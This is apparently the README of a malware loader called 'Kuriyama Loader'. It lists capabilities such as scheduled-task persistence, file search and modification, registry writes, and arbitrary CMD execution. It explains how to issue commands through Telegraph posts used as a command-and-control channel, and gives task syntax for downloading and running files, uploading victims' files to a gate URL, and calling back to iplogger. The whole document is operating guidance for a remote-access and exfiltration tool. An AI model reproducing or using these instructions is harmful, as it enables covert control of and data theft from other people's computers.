<h1>Kuriyama Loader</h1>
<h3>Functions</h3>
<ul style="list-style-type:disc">
  <li>Task Scheduler startup</li>
  <li>Process restart every minute</li>
  <li>Search/Modify files</li>
  <li>Download/Upload files</li>
  <li>Execute commands in CMD</li>
  <li>Modify registry</li>
  <li>Process check</li>
  <li>Process start</li>
  <li>Callback after task complete</li>
</ul>
<br>
<h3>Usage</h3>
<pre>Make a post at <a href="http://telegra.ph">Telegraph</a>.<br>
Name and descriptions should be "Kur" (without quotes).<br> 
Every command - from new line in the content input.
</pre>
<h4>Task examples</h4>
<ul style="list-style-type:disc">
  <li>Main - type;subtype;...;iplogger!</li>
  <li>File search - files;search;file_path;http://iplogger!</li>
  <li>File write - files;write;file_path;content;http://iplogger!</li>
  <li>Download and execute - net;load;file_download_url;file_name;http://iplogger!</li>
  <li>Upload file - net;upload;gate_url;file_path;http://iplogger!</li>
  <li>Execute cmd command - system;cmd;command;http://iplogger!</li>
  <li>Registry write - system;registry;key;key_name;value;http://iplogger!</li>
  <li>Process check - system;check_process;process_name;http://iplogger!</li>
  <li>Process start - system;run_process;file_path;http://iplogger!</li>
</ul>
